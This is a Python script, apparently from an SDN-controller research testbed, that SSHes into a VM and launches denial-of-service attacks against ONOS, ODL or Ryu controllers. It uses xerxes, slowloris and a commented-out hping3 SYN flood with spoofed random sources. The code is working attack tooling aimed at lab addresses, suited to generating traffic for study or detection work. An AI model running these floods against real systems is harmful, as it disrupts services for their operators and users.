####################################################################
#                       ATTACKLOAD GENERATOR                       #
####################################################################


import subprocess
import random
import paramiko
import os, time

'''
def DoS(ip, dos_duration, size):
    print('DoS attack starting')
    cmd = ["sudo", "hping3", "-S", "-P", "-U", "--flood", "-V", "--rand-source", str(ip), "-d", str(size)]
    try:
        subprocess.run(cmd, timeout=dos_duration)
    except subprocess.TimeoutExpired:
        print("\nCommand timed out after", dos_duration, "seconds.")
    except Exception as e:
        print(f"Error while executing the command: {e}")
    else:
        print("Command executed successfully.")
'''

# Secure connection w/ Vm1
def connection(controller_ip):

    try:
        print("Connecting to the controller...")
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(controller_ip, username="admin", key_filename="/home/admin/.ssh/id_rsa")
    
    except paramiko.AuthenticationException:
        print("Authentication failed. Please check your credentials.")
    except paramiko.SSHException as ssh_err:
        print(f"SSH error: {ssh_err}")
    except Exception as e:
        print(f"Error: {e}")
            
    return client
            
# DoS Generator
def run_dos_attack(controller_name, client):
    if controller_name == 'onos':
        target_ip = '172.17.0.2'
        target_port = '9876'
    if controller_name == 'odl' or controller_name == 'ryu':
        target_ip = '127.0.0.1'
        target_port = '6653'
        
    cmd = f"cd XERXES && ./xerxes {target_ip} {target_port} > output.txt 2>&1"
    print("Executing command...")
    stdin, stdout, stderr = client.exec_command(cmd)
    
    
def stop_connection(client):
    try:
        # Stop DoS attack
        stop_cmd = "pkill -f xerxes"
        stdin, stdout, stderr = client.exec_command(stop_cmd)
        print("All xerxes processes stopped successfully.")
    except Exception as e:
        print(f"Error stopping xerxes processes: {e}")

    try:
        # Stop the connection w/ Vm1
        print("Closing connection...")
        client.close()
        print("Closed")
    except Exception as e:
        print(f"Error while closing connection: {e}")

    
# Slowloris Generator
def run_slowloris(controller_name, client):
    if controller_name == 'onos':
        target_ip = '172.17.0.2'
    if controller_name == 'odl' or controller_name == 'ryu':
        target_ip = '127.0.0.1'
        
    cmd = f"sudo slowloris {target_ip}"
    print("Executing command...")
    stdin, stdout, stderr = client.exec_command(cmd)


def initialize(folder, controller_name, controller_ip, rest_port, client):

    if folder == 'DoS':
        print('DoS attack starting')
        client = run_dos_attack(controller_name, client)


    elif folder =='slowloris': 
        print('DoS Slowloris attack starting')
        client = run_slowloris(controller_name, client)
        



